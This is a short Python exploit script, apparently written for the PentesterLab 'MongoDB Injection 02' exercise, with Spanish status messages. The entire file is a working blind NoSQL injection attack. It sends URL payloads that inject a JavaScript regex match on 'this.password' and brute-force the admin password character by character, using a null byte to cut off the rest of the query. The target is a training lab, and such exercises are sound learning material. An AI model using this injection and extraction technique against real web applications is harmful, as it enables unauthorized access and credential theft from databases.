#!/usr/bin/env python3

# PentesterLab MongoDB Injection 02

import requests
from pwn import *
import signal
import sys
import string
import time

def def_handler(sig, frame):
  print("\n[!] Saliendo...\n")
  sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Global variables...
hostDomain = "https://ptl-acc5eacc-666f42f4.libcurl.so/"
characters = string.digits + string.ascii_letters + '-'

def main():
  p1 = log.progress("Fuerza bruta")
  p1.status("Iniciando proceso de fuerza bruta")

  time.sleep(2)

  p2 = log.progress("Datos extraídos")
  password = ""

  for position in range(36):
    for character in characters:
      query = "/?search=admin%27%20%26%26%20this.password.match(/^" + f"{password}{character}{'' if position == 35 else '.*'}$/)%00"
      p1.status(query)
      response = requests.get(hostDomain + query)

      if "<tr><td><a href=\"?search=admin\">admin</a></td></tr>" in response.text:
        password += character
        p2.status(password)
        break
    


if __name__ == "__main__":
  main()
